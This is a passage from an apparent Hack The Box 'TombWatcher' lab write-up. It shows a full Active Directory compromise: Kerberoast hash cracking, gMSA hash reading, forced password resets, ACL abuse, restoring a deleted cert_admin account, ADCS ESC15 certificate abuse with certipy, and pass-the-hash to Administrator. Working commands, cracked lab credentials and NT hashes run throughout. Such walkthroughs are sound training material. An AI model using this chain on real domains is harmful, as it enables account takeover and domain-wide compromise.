e8dac4b51902e4a488f28e25b13d27898c38ea87b4bbc637071cb6fb315dbce3f54bbfde107419be8ff4af6f470e768fd6a602592690a3b0306daab36adecf28008186ce368a3ad92d03bcd65148b674c5c96b38c584c36b7d34113ee3dd17b01fa0c0e0bbf6e998a26774340ad5816a1b88e8ed06d586584aa9a5a8fae3bc4492d7a0f4d6e06c85ad92cb4f5fa040d7422c8782e9c3435eec62b9e83834955fd8aa7cd623634aad2c6ed58779ea70360e50e3ed4c0fc279b91a3a3b79960181f4eef4358f14a4bfb89e5a43b492838708df2c42c5b2 
```

Now crack the offline Kerberos ticket retrieved for the alfred account using John the Ripper and a wordlist:

```
┌──(venv)─(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup/targetedKerberoast]
└─$ john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt  

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2025-06-08 05:37) 50.00g/s 51200p/s 51200c/s 51200C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

**Credential alfred:basketball**

### AddSelf

Now, looking at Alfred's outbound, we see he can add **himself** to the INFRASTRUCTURE group — so add him to that group.

<img src="assets/HTB/TombWatcher/image3.png" alt="Error Loading Image"/>


```
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup]
└─$ bloodyAD --host $IP -d tombwatcher.htb -u "alfred" -p "basketball" add groupMember "INFRASTRUCTURE" "alfred"
[+] alfred added to INFRASTRUCTURE
```

### ReadGMSAPasword

Here it's clear that a member of the `INFRASTRUCTURE` group can read the gMSA for `ansible_dev`. **Alfred** is now in `INFRASTRUCTURE`, so read the gMSA with:


<img src="assets/HTB/TombWatcher/image4.png" alt="Error Loading Image"/>


```
┌──(venv)─(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup/targetedKerberoast]
└─$ nxc ldap tombwatcher.htb -d tombwatcher.htb -u 'alfred' -p 'basketball' --gmsa
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.72     636    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAPS       10.10.11.72     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.72     636    DC01             Account: ansible_dev$         NTLM: 1c37d00093dc2a5f25176bf2d474afdc
```
**ansible_dev$:1c37d00093dc2a5f25176bf2d474afdc**

### ForceChangePassword

Here we can see `ansible_dev$` has **ForceChangePassword** on sam, so change `sam's` password using the NT hash of user ansible.

<img src="assets/HTB/TombWatcher/image5.png" alt="Error Loading Image"/>

```
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup]
└─$ bloodyAD --host tombwatcher.htb -d tombwatcher.htb -u 'ansible_dev$' -p ':1c37d00093dc2a5f25176bf2d474afdc' set password 'CN=SAM,CN=USERS,DC=TOMBWATCHER,DC=HTB' 'Password123!'
[+] Password changed successfully!

```
### WriteOwner

Now, looking at SAM's outbound, we see SAM has **WriteOwner** on `JOHN`. We'll do two things: first become the owner of `JOHN`, then give SAM full control so we can read or change JOHN's password.

<img src="assets/HTB/TombWatcher/image6.png" alt="Error Loading Image"/>

```
# become owner
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "SAM" -p 'Password123!' set owner JOHN SAM

# give SAM full control (genericAll)
bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'SAM' -p 'Password123!' add genericAll 'CN=JOHN,CN=Users,DC=tombwatcher,DC=htb' 'SAM'

# set JOHN's password
bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'SAM' -p 'Password123!' set password 'CN=JOHN,CN=Users,DC=tombwatcher,DC=htb' 'NewP@ssword123!'
```
```                                                                                                                                                                                       
┌──(venv)─(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup/targetedKerberoast]
└─$  bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "SAM" -p 'Password123!' set owner JOHN SAM
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by SAM on JOHN
                                                                                                                                                                                             
┌──(venv)─(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup/targetedKerberoast]
└─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'SAM' -p 'Password123!' add genericAll 'CN=JOHN,CN=Users,DC=tombwatcher,DC=htb' 'SAM' 

[+] SAM has now GenericAll on CN=JOHN,CN=Users,DC=tombwatcher,DC=htb
                                                                                                                                                                                             
┌──(venv)─(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup/targetedKerberoast]
└─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'SAM' -p 'Password123!' set password 'CN=JOHN,CN=Users,DC=tombwatcher,DC=htb' 'NewP@ssword123!' 

[+] Password changed successfully!

```

### Access as JOHN

John is a member of the Remote Management group — connect via WinRM:

```
┌──(venv)─(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup/targetedKerberoast]
└─$ evil-winrm -i 10.10.11.72 -u john -p NewP@ssword123!             
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> type ..\Desktop\user.txt
**********ba26ff4e483ca96691db1d
*Evil-WinRM* PS C:\Users\john\Documents>
```


## Privilege Escalation

Here we can see the user `john` has **GENERIC_ALL** on the `OU=ADCS`.

<img src="assets/HTB/TombWatcher/image7.png" alt="Error Loading Image"/>

Now we Run `bloodyAD` as **john** against the domain controller to fetch the `OU=ADCS` object and resolve its security descriptor, showing ACLs and ownership info.

```
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup]
└─$ bloodyAD -u 'john' -p 'NewP@ssword123!' -d tombwatcher.htb --dc-ip 10.10.11.72 get object 'OU=ADCS,DC=tombwatcher,DC=htb' --resolve-sd

distinguishedName: OU=ADCS,DC=tombwatcher,DC=htb
dSCorePropagationData: 2024-11-16 17:07:10+00:00
instanceType: 4
nTSecurityDescriptor.Owner: Domain Admins
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == DENIED ==
nTSecurityDescriptor.ACL.0.Trustee: EVERYONE
nTSecurityDescriptor.ACL.0.Right: DELETE|DELETE_TREE
nTSecurityDescriptor.ACL.0.ObjectType: Self
nTSecurityDescriptor.ACL.1.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.1.Trustee: ACCOUNT_OPERATORS
nTSecurityDescriptor.ACL.1.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.1.ObjectType: User; Group; Computer; inetOrgPerson
nTSecurityDescriptor.ACL.2.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.2.Trustee: PRINTER_OPERATORS
nTSecurityDescriptor.ACL.2.Right: DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.2.ObjectType: Print-Queue
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: Domain Admins; LOCAL_SYSTEM
nTSecurityDescriptor.ACL.3.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.3.ObjectType: Self
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: john
nTSecurityDescriptor.ACL.4.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.4.Flags: CONTAINER_INHERIT
nTSecurityDescriptor.ACL.5.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.5.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS; AUTHENTICATED_USERS
nTSecurityDescriptor.ACL.5.Right: GENERIC_READ
nTSecurityDescriptor.ACL.5.ObjectType: Self
nTSecurityDescriptor.ACL.6.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.6.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.6.Right: READ_PROP
nTSecurityDescriptor.ACL.6.ObjectType: Account-Restrictions (property set); Group-Membership (property set); General-Information (property set); Remote-Access-Information (property set); Logon-Information (property set)
nTSecurityDescriptor.ACL.6.InheritedObjectType: User; inetOrgPerson
nTSecurityDescriptor.ACL.6.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.7.Trustee: Key Admins; Enterprise Key Admins
nTSecurityDescriptor.ACL.7.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.7.ObjectType: 5b47d60f-6090-40b2-9f37-2a4de88f3063
nTSecurityDescriptor.ACL.7.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.8.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.8.Trustee: CREATOR_OWNER; PRINCIPAL_SELF
nTSecurityDescriptor.ACL.8.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.8.ObjectType: DS-Validated-Write-Computer
nTSecurityDescriptor.ACL.8.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.8.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.9.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.9.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.9.Right: READ_PROP
nTSecurityDescriptor.ACL.9.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.9.InheritedObjectType: User; Computer; Group
nTSecurityDescriptor.ACL.9.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.10.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.10.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.10.Right: WRITE_PROP
nTSecurityDescriptor.ACL.10.ObjectType: ms-TPM-Tpm-Information-For-Computer
nTSecurityDescriptor.ACL.10.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.10.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.11.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.11.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.11.Right: GENERIC_READ
nTSecurityDescriptor.ACL.11.ObjectType: Self
nTSecurityDescriptor.ACL.11.InheritedObjectType: User; Group; inetOrgPerson
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.12.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.12.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.12.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.12.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
nTSecurityDescriptor.ACL.13.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.13.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.13.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.13.ObjectType: Private-Information (property set)
nTSecurityDescriptor.ACL.13.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.14.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.14.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.14.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.14.ObjectType: Self
nTSecurityDescriptor.ACL.14.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.15.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.15.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.15.Right: LIST_CHILD
nTSecurityDescriptor.ACL.15.ObjectType: Self
nTSecurityDescriptor.ACL.15.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.16.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.16.Trustee: BUILTIN_ADMINISTRATORS
nTSecurityDescriptor.ACL.16.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.16.ObjectType: Self
nTSecurityDescriptor.ACL.16.Flags: CONTAINER_INHERIT; INHERITED
name: ADCS
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
objectClass: top; organizationalUnit
objectGUID: be54cc4b-f7f3-4069-9085-18d905ff7a31
ou: ADCS
uSNChanged: 12856
uSNCreated: 12839
whenChanged: 2024-11-16 00:56:05+00:00
whenCreated: 2024-11-16 00:55:59+00:00

```


What *is* interesting: `john` has **GENERIC_ALL** on `OU=ADCS`, so he effectively has full control over that OU (can create/modify/delete child objects). Also note `Key Admins` / `Enterprise Key Admins` have read/write on certificate-related object types — this OU looks like an AD CS area and is worth investigating.

### Tomb Stoned

After finding nothing useful in ADCS, the machine name *TombWatcher* suggested checking for deleted (tombstoned) objects.
We’ll search for deleted admin or useful user accounts that might be recoverable or reveal privilege escalation paths.


Retrieves logically deleted user objects (tombstoned users) from Active Directory along with key properties.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List
```


Restores the deleted user object with the specified GUID back into Active Directory.

```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

Resets the `cert_admin` account password to a known value (`Password123!`).

```powershell
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
```

Enables the cert_admin account, making it active and usable again.


```powershell
Enable-ADAccount -Identity cert_admin
```


```
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List


Name            : cert_admin
                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectGUID      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1109
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Name            : cert_admin
                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectGUID      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1110
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Name            : cert_admin
                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectGUID      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1111
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb



*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
*Evil-WinRM* PS C:\Users\john\Documents> 
*Evil-WinRM* PS C:\Users\john\Documents> 
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
*Evil-WinRM* PS C:\Users\john\Documents> 
*Evil-WinRM* PS C:\Users\john\Documents> 
*Evil-WinRM* PS C:\Users\john\Documents> Enable-ADAccount -Identity cert_admin
*Evil-WinRM* PS C:\Users\john\Documents> 
*Evil-WinRM* PS C:\Users\john\Documents> exit
```

### ADCS ESC 15

After recovering cert_admin, run certipy to check for vulnerable CA templates:

```
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup]
└─$ certipy find -u cert_admin@tombwatcher.htb -p 'Password123!' -dc-ip 10.10.11.72
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250608100806_Certipy.txt'
[*] Wrote text output to '20250608100806_Certipy.txt'
[*] Saving JSON output to '20250608100806_Certipy.json'
[*] Wrote JSON output to '20250608100806_Certipy.json'
                                                        
```
```
17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.

```

The output shows **ESC15 (CVE-2024-49019 / “EKUwu”)** is present — the CA is vulnerable to Application Policy injection.

**ESC15 (aka “EKUwu”)**

ESC15 (CVE-2024-49019) is a post-compromise AD CS flaw that lets an attacker supply arbitrary *Application Policies* when enrolling certificates from **Schema v1 (V1) templates** that allow “enrollee supplies subject.” A vulnerable CA may include those attacker-supplied policies (for example Client Authentication or Enrollment Agent) in the issued cert, enabling unexpected actions like client logon or acting as an enrollment agent — which can lead to privilege escalation and domain compromise.

More reading: **[Certipy Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)**


**Get agent cert (inject Certificate Request Agent OID)**

First I Requested a cert with `-application-policies 1.3.6.1.4.1.311.20.2.1`; CA issued cert_admin.pfx (agent cert).

```
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup]
└─$ certipy req -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -application-policies "1.3.6.1.4.1.311.20.2.1" -ca tombwatcher-CA-1 -template WebServer -dc-ip 10.10.11.72  
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

**Request cert on behalf of Administrator**

Used cert_admin.pfx with -on-behalf-of to get administrator.pfx containing Administrator’s UPN and SID.

```                       
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup]
└─$ certipy req -u 'cert_admin@tombwatcher.htb' -p 'Password123!' -on-behalf-of TOMBWATCHER\\Administrator -template User -ca tombwatcher-CA-1 -pfx cert_admin.pfx -dc-ip 10.10.11.72  
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**Authenticate with the on-behalf-of cert**

`certipy auth -pfx administrator.pfx` performed PKINIT, obtained a TGT and saved administrator.ccache (and extracted the NT hash).

```                          
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72  
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc                                         
```
### Pass-the-hash (Administrator)

Used the extracted NT hash, authenticate as Administrator and read root.txt.

```
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup]
└─$ evil-winrm -i 10.10.11.72 -u administrator -H f61db423bebe3328d33af26741afe5fc

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
**********dbff5567009083b80ad2e4
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
*Evil-WinRM* PS C:\Users\Administrator\Documents> exit
                                        
Info: Exiting with code 0
```
